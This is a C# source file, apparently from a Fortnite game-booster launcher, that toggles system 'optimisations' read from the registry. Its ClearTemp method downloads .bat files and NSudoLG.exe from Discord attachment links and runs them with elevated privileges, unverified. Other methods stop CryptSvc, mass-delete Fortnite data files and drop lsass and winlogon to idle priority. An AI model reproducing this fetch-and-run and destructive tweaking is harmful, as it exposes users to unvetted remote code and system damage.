using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GPB
{
    class GPBDLL
    {
        // Download All Variables
        public static RegistryKey Settings = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\MoonLauncher");
        public static string EpicGamesDirectory = Settings.GetValue("EpicGamesDirectory").ToString();
        public static string FortniteGameDirectory = Settings.GetValue("FortniteGamePath").ToString();
        private static object ClearTempEnable = Settings.GetValue("ClearTemp");
        private static object DisableServicesObject = Settings.GetValue("DisableServices");
        private static object GPBEnable = Settings.GetValue("GPBEnable");
        private static object KillNvidiaEnable = Settings.GetValue("KillNVIDIA");
        private static object KillProcessesEnable = Settings.GetValue("KillProcesses");
        private static object TweakProritiesEnable = Settings.GetValue("TweakPriorities");
        private static object ClearFNCacheEnable = Settings.GetValue("ClearFNCache");

        // Convert Variables to int
        public static int ClearTempValue = Convert.ToInt32(ClearTempEnable);
        public static int DisableServicesValue = Convert.ToInt32(DisableServicesObject);
        public static int KillNvidiaValue = Convert.ToInt32(KillNvidiaEnable);
        public static int KillProcessesValue = Convert.ToInt32(KillProcessesEnable);
        public static int TweakProritiesValue = Convert.ToInt32(TweakProritiesEnable);
        public static int GPBEnableValue = Convert.ToInt32(GPBEnable);
        public static int ClearFNCacheValue = Convert.ToInt32(ClearFNCacheEnable);

        public static string TempDirectory = Path.GetTempPath();

        public static void ClearTemp(int value)
        {
            if (value == 1)
            {
                WebClient wb = new WebClient();
                wb.DownloadFile("https://cdn.discordapp.com/attachments/1029753461929164912/1038159643601547354/temp.bat", $@"{TempDirectory}\temp.bat");
                wb.DownloadFile("https://cdn.discordapp.com/attachments/1029753461929164912/1038152072660533458/prefetch.bat", $@"{TempDirectory}\prefetch.bat");
                wb.DownloadFile("https://cdn.discordapp.com/attachments/1029755161561813043/1038411175811096607/NSudoLG.exe", $@"{TempDirectory}\NSudoLG.exe");
                LauncherCore.MoonLauncher.nsudoCall(@$"{TempDirectory}\prefetch.bat");
                LauncherCore.MoonLauncher.nsudoCall(@$"{TempDirectory}\temp.bat");
            }
        }

        public static void DisableServices(int value)
        {
            if (value == 1)
            {
                LauncherCore.MoonLauncher.RunCMD("sc stop CryptSvc");
                LauncherCore.MoonLauncher.RunCMD("sc stop XboxNetApiSvc");
                LauncherCore.MoonLauncher.RunCMD("sc stop XboxGipSvc");
                LauncherCore.MoonLauncher.RunCMD("sc stop XblGameSave");
                LauncherCore.MoonLauncher.RunCMD("sc stop XblAuthManager");
                LauncherCore.MoonLauncher.RunCMD("taskkill /IM EpicGamesLauncher.exe /f");
            }
        }

        public static void ClearFNCache(int value)
        {
            if (value == 1)
            {
                LauncherCore.MoonLauncher.RunCMD(@"attrib +r %localAppData%\FortniteGame\Saved\Config\WindowsClient\gameusersettings.ini");
                LauncherCore.MoonLauncher.RunCMD(@"forfiles -p ""%localAppData%\FortniteGame"" -s -m *.* /C ""cmd /c del @path /Q""");
            }
        }

        public static void KillProcesses(int value)
        {
            if (value == 1)
            {
                LauncherCore.MoonLauncher.RunCMD("taskkill /IM TextInputHost.exe /f");
                LauncherCore.MoonLauncher.RunCMD("taskkill /IM OneDrive.exe /f");
            }
            
        }

        public static void KillNVServices(int value)
        {
            if (value == 1)
            {
                LauncherCore.MoonLauncher.RunCMD("sc stop NVDisplay.ContainerLocalSystem");
            }
        }

        public static async void OpenGame(string EpicGamesDirectory, string FortniteGamePath)
        {
            Process.Start(@$"{EpicGamesDirectory}\Launcher\Engine\Binaries\Win64\EpicGamesLauncher.exe");
            await Task.Delay(5000);
            Process.Start($@"{FortniteGamePath}\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe");
        }

        public static void TweakPriorities(int value)
        {
            if (value == 1)
            {
                Process[] dwm = Process.GetProcessesByName("dwm");
                dwm[0].PriorityClass = ProcessPriorityClass.Idle;
                Process[] lsass = Process.GetProcessesByName("lsass");
                lsass[0].PriorityClass = ProcessPriorityClass.Idle;
                Process[] winlogon = Process.GetProcessesByName("Winlogon");
                winlogon[0].PriorityClass = ProcessPriorityClass.Idle;
            }
        }







    }
}
